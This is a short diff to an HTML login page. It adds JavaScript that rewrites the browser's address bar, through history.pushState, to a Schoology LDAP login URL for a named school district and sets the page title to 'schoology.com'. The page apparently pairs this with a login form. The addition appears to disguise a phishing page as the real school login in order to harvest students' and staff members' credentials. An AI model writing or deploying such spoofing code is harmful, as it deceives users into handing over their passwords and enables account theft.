@@ -107,6 +107,13 @@
   </footer>
 
   <script type="text/javascript">
+      function changeURL(newURL) {
+            window.history.pushState({}, '', newURL);
+            document.title = 'schoology.com';
+        }
+
+        // Call the function to change the URL
+        changeURL('http://amityregion5.schoology.com/login/ldap?&school=5672843957');
     $(document).ready(function(){
       if (typeof $ !== 'undefined' && $('form input[type="text"]:first').length) {
           $('form input[type="text"]:first').focus();
